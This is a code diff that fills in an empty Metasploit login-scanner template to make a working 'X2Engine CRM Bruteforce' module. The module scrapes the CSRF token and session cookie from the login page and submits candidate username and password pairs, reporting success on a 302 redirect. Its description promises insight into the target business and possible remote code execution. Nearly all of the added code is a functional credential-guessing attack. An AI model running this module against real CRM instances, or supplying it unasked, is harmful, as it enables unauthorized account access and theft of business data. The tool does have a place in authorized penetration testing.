@@ -10,7 +10,7 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class Empty < ::Metasploit::Framework::LoginScanner::HTTP
+      class X2EngineCRM < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
@@ -26,9 +26,34 @@ module Metasploit
             cli.connect
 
             req = cli.request_cgi({
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'index.php/site/login'
             })
 
             res = cli.send_recv(req)
+
+            res && res.body =~ /<input type="hidden" value="(.*?)" name="YII_CSRF_TOKEN"\/>/
+            csrf = $1
+            cookie = res.get_cookies
+
+            req = cli.request_cgi({
+              'uri' =>  uri + (uri[-1] == '/' ? '' : '/') + 'index.php/site/login',
+              'method' => 'POST',
+              'vars_post' => {
+                'YII_CSRF_TOKEN' => csrf,
+                'LoginForm[username]' => credential.public,
+                'LoginForm[password]' => credential.private
+              },
+              'cookie' => cookie
+            })
+
+            res = cli.send_recv(req)
+
+            if res && res.code == 302
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
+            else
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
+            end
+
           rescue Exception => e
             result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
           end
@@ -50,17 +75,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'Empty Login Scanner',
+        'Name'           => 'X2Engine CRM Bruteforce',
         'Description'    => %q(
-        This is a short description for a login scanner.
+        This modules attempts to bruteforce valid credentials on an X2Engine CRM instance.
 
-        A longer description follows the short description, going
-        into more detail about the product that the module bruteforces
-        or other useful information or documentation.
+        X2Engine is a powerful open-source CRM for small- or
+        medium-sized businesses. Gaining credentialed access
+        to X2Engine instances can yield great insight into
+        how a business operates, information on potential high
+        value targets, and even remote code execution. This module
+        attempts to bruteforce valid credentials for the
+        X2Engine CRM instance.
 
         Categories: Open Source
 
-        Price: 0
+        Price: 3
 
         Video: none
 
@@ -78,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
           [
           ],
         'DefaultOptions' => {
-            'RPORT'           => 7000,
+            'RPORT'           => 80,
             'STOP_ON_SUCCESS' => true
         }
     )
@@ -95,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    scanner = Metasploit::Framework::LoginScanner::Empty.new(
+    scanner = Metasploit::Framework::LoginScanner::X2EngineCRM.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
